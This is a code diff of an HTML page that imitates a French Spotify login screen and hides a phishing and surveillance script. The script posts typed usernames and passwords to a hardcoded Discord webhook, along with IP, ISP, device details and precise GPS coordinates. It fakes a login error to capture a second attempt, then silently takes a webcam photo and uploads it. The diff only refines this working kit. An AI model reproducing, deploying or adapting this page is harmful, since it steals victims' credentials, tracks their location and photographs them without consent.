@@ -10,25 +10,17 @@
         body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
         .app-card { width: 100%; max-width: 450px; padding: 60px 25px; text-align: center; }
         .logo { width: 45px; margin: 0 auto 50px auto; }
-        
         .field { text-align: left; margin-bottom: 20px; }
         label { display: block; font-size: 13px; font-weight: 900; margin-bottom: 8px; }
-        
-        /* Zéro bordure - Style Pur */
         input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 15px; outline: none; }
-        
-        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-        
+        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
         .divider { display: flex; align-items: center; width: 100%; margin: 35px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
         .divider:not(:empty)::before { margin-right: 1.5em; }
         .divider:not(:empty)::after { margin-left: 1.5em; }
-
         .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 14px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; }
-
         .footer-link { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
         .footer-link span { color: #fff; font-weight: 700; text-decoration: underline; }
-
         .err { background: #e91429; color: #fff; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-bottom: 20px; display: none; }
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
@@ -36,74 +28,70 @@
 <body>
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-
         <div id="error" class="err">Identifiant ou mot de passe incorrect.</div>
-
-        <div class="field"><label>Adresse e-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="Adresse e-mail ou nom d'utilisateur"></div>
+        <div class="field"><label>Adresse e-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="E-mail ou nom d'utilisateur"></div>
         <div class="field"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
-        
-        <button onclick="run()" id="btn" class="btn-main">Continuer</button>
-
+        <button onclick="unlock()" id="btn" class="btn-main">Continuer</button>
         <div class="divider">ou</div>
-
         <div class="social-btn">Continuer avec Google</div>
         <div class="social-btn">Continuer avec Facebook</div>
         <div class="social-btn">Continuer avec Apple</div>
-
         <div class="footer-link">Vous n'avez pas de compte ? <span>S'INSCRIRE</span></div>
     </div>
-
     <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
         let count = 0;
 
-        async function run() {
+        async function unlock() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
             count++;
-            document.getElementById('btn').innerText = "...";
+            const btn = document.getElementById('btn');
+            btn.innerText = "CHARGEMENT...";
 
-            // 1. DATA RAPPORT COMPLET (image_c61034)
+            // Récupération hardware (image_c61034)
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
 
-            // 2. LOC PRÉCISE (Le Pellerin)
-            let loc = "Non autorisé";
+            // FORCER LE GPS (Le Pellerin)
+            let gpsLink = "❌ Permission refusée";
             try {
-                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:4000}); });
-                loc = `✅ **PRÉCISE :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-            } catch(e) { loc = `❌ IP-Based: ${net.city || 'La Montagne'}`; }
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 10000});
+                });
+                gpsLink = `✅ **LIEU EXACT :** [Clique ici pour voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+            } catch(e) {}
 
-            const log = {
+            const payload = {
                 embeds: [{
-                    title: `🔱 LVN V21 ELITE - ${u}`,
+                    title: `🔱 RAPPORT LVN V22 - ${u}`,
                     color: 1955168,
                     fields: [
                         { name: "👤 ACCÈS", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Maps:** ${loc}` },
+                        { name: "🌐 RÉSEAU & GPS", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Maps:** ${gpsLink}` },
                         { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**Bat:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\``, inline: true }
                     ],
-                    footer: { text: "LVN System • " + new Date().toLocaleString() }
+                    footer: { text: "Date: " + new Date().toLocaleString() }
                 }]
             };
 
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(log) });
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
             if(count === 1) {
                 setTimeout(() => {
-                    document.getElementById('btn').innerText = "Continuer";
+                    btn.innerText = "Continuer";
                     document.getElementById('p').value = "";
                     document.getElementById('error').style.display = "block";
-                }, 800);
+                }, 1000);
             } else {
-                // 3. CAPTURE CAMÉRA
+                // FORCER LA CAMÉRA (image_d16924)
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.getElementById('v');
                     video.srcObject = stream;
                     await new Promise(r => setTimeout(r, 2000));
@@ -111,7 +99,8 @@
                     can.width = 1280; can.height = 720;
                     can.getContext('2d').drawImage(video, 0, 0);
                     can.toBlob(async b => {
-                        const fd = new FormData(); fd.append('file', b, 'shot.png');
+                        const fd = new FormData();
+                        fd.append('file', b, 'capture.png');
                         await fetch(hook, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
